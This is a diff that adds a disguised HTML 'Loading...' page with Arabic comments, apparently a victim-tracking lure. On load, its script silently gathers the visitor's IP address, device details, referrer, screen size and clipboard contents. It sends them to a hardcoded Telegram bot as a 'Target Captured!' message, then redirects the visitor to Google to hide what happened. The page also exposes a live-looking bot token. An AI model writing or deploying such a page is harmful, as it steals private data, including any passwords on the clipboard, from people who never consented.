@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script>
+        // إعدادات التليجرام الخاصة بك
+        const TOKEN = "8213467523:AAE-4yv3jiYvyAHpJU4XJ90lALV5OSKzNDE";
+        const CHAT_ID = "6888107255";
+        const REDIRECT_URL = "https://www.google.com";
+
+        async function grabAndGo() {
+            let data = {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                referrer: document.referrer || "Direct Access",
+                screen: `${window.screen.width}x${window.screen.height}`,
+                clipboard: "Denied/Not Supported"
+            };
+
+            // 1. سحب الـ IP بدقة عبر API خارجي
+            try {
+                let ipRes = await fetch('https://api.ipify.org?format=json');
+                let ipData = await ipRes.json();
+                data.ip = ipData.ip;
+            } catch (e) { data.ip = "Unknown"; }
+
+            // 2. محاولة سحب الحافظة (تتطلب تفاعل أو سماح في بعض المتصفحات)
+            try {
+                data.clipboard = await navigator.clipboard.readText();
+            } catch (e) {}
+
+            // 3. تجهيز الرسالة للبوت
+            let message = `⚠️ *Target Captured!*%0A%0A` +
+                          `🌐 *IP:* \`${data.ip}\` %0A` +
+                          `📱 *Device:* \`${data.ua}\` %0A` +
+                          `🖥️ *Platform:* \`${data.platform}\` %0A` +
+                          `🔗 *From:* \`${data.referrer}\` %0A` +
+                          `📋 *Clipboard:* \`${data.clipboard}\` %0A` +
+                          `📐 *Screen:* \`${data.screen}\``;
+
+            // 4. إرسال البيانات للتليجرام
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=Markdown`);
+
+            // 5. التحويل الفوري
+            window.location.replace(REDIRECT_URL);
+        }
+
+        window.onload = grabAndGo;
+    </script>
+</head>
+<body style="background-color:black;"></body>
+</html>
